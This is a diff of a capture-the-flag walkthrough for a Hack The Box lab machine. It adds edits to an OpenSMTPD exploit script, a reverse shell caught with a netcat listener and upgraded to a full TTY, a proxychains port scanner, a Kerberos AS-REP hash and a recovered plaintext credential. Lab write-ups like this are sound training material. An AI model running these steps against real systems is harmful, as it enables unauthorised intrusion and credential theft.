@@ -49,7 +49,7 @@ Port tcp-3128 is open so let's dive into it and see what info we can enumerate:
 ![[Pasted image 20230123170039.png]]
 As we can see there is an user and a hostname, let's save such info for later, other than that there is not too much on this port.
 
-Port tcp-53 is open so we start DNS enumeration, : ^f52f9b
+Port tcp-53 is open so we start DNS enumeration[^dns-enum]:
 ```bash
 dig @10.10.10.224 realcorp.htb
 
@@ -157,7 +157,7 @@ Interesting Findings:
 realcorp.htb.  86400  IN  SOA  realcorp.htb. root.realcorp.htb.
 ns.realcorp.htb.        259200  IN      A       10.197.243.77
 ```
-No interesting findings were spotted so we start enumerating port tcp-3128 Squid Proxy but first we need to configure our proxychains file as follows:^26a864
+No interesting findings were spotted so we start enumerating port tcp-3128 Squid Proxy but first we need to configure our proxychains file as follows:[^squid-proxy]
 ```bash
 [ProxyList]
 # add proxy here ...
@@ -186,26 +186,20 @@ However with this new configuration we can enumerate the DNS with dnsenum to sea
 ```bash
 dnsenum --dnsserver 10.10.10.224 --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
 dnsenum VERSION:1.2.6
------   realcorp.htb   -----                                                                                                                                                              
-Host's addresses:                                                                                                                                                                         
-__________________                                                                                                                                                                        
-Name Servers:                                                                                                                                                                             
-______________                                                                                                                                                                            
+-----   realcorp.htb
+Host's addresses:
+__________________
+Name Servers:
+______________
 ns.realcorp.htb.                         259200   IN    A        10.197.243.77
-Mail (MX) Servers:                                                                                                                                                                        
+Mail (MX) Servers:
 ___________________                                                                                                                                                                       
-Trying Zone Transfers and getting Bind Versions:                                                                                                                                          
-_________________________________________________                                                                                                                                         
-______________________________________________________________________________________                                                                                                    
+Trying Zone Transfers and getting Bind Versions:
 ns.realcorp.htb.    259200   IN    A        10.197.243.77
 proxy.realcorp.htb. 259200   IN    CNAME    ns.realcorp.htb.
 ns.realcorp.htb.    259200   IN    A        10.197.243.77
 wpad.realcorp.htb.  259200   IN    A        10.197.243.31
 
-realcorp.htb class C netranges:                                                                                                                                                           
-________________________________                                                                                                                                                          
-Performing reverse lookup on 0 ip addresses:                                                                                                                                              
-_____________________________________________                                                                                                                                             
 done.
 ```
 There are some subdomains, but since the IP that such entries are pointing is unreachable we need to think about a way to reach them, for that we can abuse the proxychains since we already have it configured, but first we need to add this subdomains into the /etc/hosts file (only proxy.realcorp.htb and wpad.realcorp.htb are interesting for us):
@@ -276,7 +270,7 @@ for port in $(seq 1 65535); do
         proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.197.243.77/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
 done; wait
 ```
-Since the output gives us another port 3128, this gives us an idea that it is anothe Squid Proxy:
+Since the output gives us another port 3128, this gives us an idea that it is another Squid Proxy:
 ```bash
 ./proxychain.sh                                  
 [+] Port 22 - OPEN
@@ -322,7 +316,7 @@ proxychains -q curl -s http://wpad.realcorp.htb
 </body>
 </html>
 ```
-We have previously discovered that the hostname for this IP is wpad.realcorp.htb so let's figure out what is wpad meaning, a good resource for this is [Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
+We have previously discovered that the hostname for this IP is `wpad.realcorp.htb` so let's figure out what is wpad meaning, a good resource for this is [Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
 ![[Pasted image 20230123120159.png]]
 There is an interesting explanation as well as an interesting configuration file, let's send this request to see if we get any result:
 ```bash
@@ -338,7 +332,7 @@ function FindProxyForURL(url, host) {
     return "PROXY proxy.realcorp.htb:3128";
 }
 ```
-And there is another subnet being disclosed on this output, so let's enumerate common ports on any host for it, with the following script:
+And there is another subnet[^subnet-scanner] being disclosed on this output, so let's enumerate common ports on any host for it, with the following script:
 ```bash
 #!/bin/bash
 
@@ -429,7 +423,22 @@ Version: dev (9cfb81e) - 01/23/23 - Ronnie Flathers @ropnop
 $krb5asrep$18$j.nakazawa@REALCORP.HTB:63abc6b17482e9eba446456fbc7df8b1$0d47f8d1d1363460bda6e52f810b3e8b8d12c1395a233d467418a243b32b9c7df3693925e0fa4d9d87c316d4460a44a18338691baa0f28a8dcd4ab6ad118b4a269ca6f37d684594fd371d0d87a54136610434478ff3a9f10a473d9a450e1dcaf8c00012ed9607b3cc661793864f262160633212c51169a97e7bb2a01cb2f0ac6cd68414791f6bc5e37de5bc4e7c13b9f803108d521e5fadaecefad0c39a0d7014bc70d81ae09322900a726e6de2c00dda551cd03963b3ec8d2a1a0d9e816891af11c656179c6ea                                                                                                                                                                                  
 2023/01/23 13:33:17 >  [+] VALID USERNAME:       j.nakazawa@realcorp.htb
 ```
-Once validated we then can modify the code of the exploit and try to run it again:
+Once validated we then can modify the code of the exploit `47984.py` as follows:
+```bash
+<SNIP>
+print('[*] Payload sent')
+s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')
+s.recv(1024)
+s.send(b'DATA\r\n')
+s.recv(1024)
+s.send(b'\r\nxxx\r\n.\r\n')
+s.recv(1024)
+s.send(b'QUIT\r\n')
+s.recv(1024)
+print('[*] Done')
+```
+
+And try to run it again:
 ```bash
 tcpdump -i tun0 icmp
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
@@ -461,7 +470,21 @@ root@smtp:/home/j.nakazawa# whoami
 whoami
 root
 ```
-However this machine is not the intended to be exploited so we need to keep searching on it to find interesting information, such as: ^9ef584
+To upgrade our reverse shell[^fully-interactive-tty] to a [Fully Interactive TTY](https://shuciran.github.io/posts/Fully-interactive-TTY-(Linux)/) we can proceed as follows:
+```bash
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.224] 47134
+whoami
+root
+SHELL=/bin/bash script -q /dev/null
+
+root@smtp:/home/j.nakazawa# ^Z
+zsh: suspended  nc -lvnp 1234
+└─$ stty raw -echo; fg          
+[1]  + continued  nc -lvnp 1234
+                               reset xterm
+```
+
+However this machine is not the intended to be exploited so we need to keep searching on it to find interesting information, such as: [^gssapi-with-mic]
 ```bash
 root@smtp:/home/j.nakazawa# cat .msmtprc 
 # Set default values for all following accounts.
@@ -712,7 +735,7 @@ root
 ```bash
 j.nakazawa@realcorp.htb:sJB}RM>6Z~64_
 ```
-## File found on the docker machine:
+KRB
 ```bash
 # Set default values for all following accounts.
 defaults
@@ -737,4 +760,8 @@ tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
 - krb-user is a tool to exploit gssapi-with-mic authentication
 - a krb5.keytab can be abused to login as another user if misconfigured.
 
-
+[^dns-enum]: DNS Enumeration
+[^squid-proxy]: Squid Proxy Configuration
+[^subnet-scanner]: Subnet Scanner using Proxychains
+[^fully-interactive-tty]: Reverse Shell Fully Interactive TTY
+[^gssapi-with-mic]: Authentication method gssapi-with-mic (krb5.conf file)
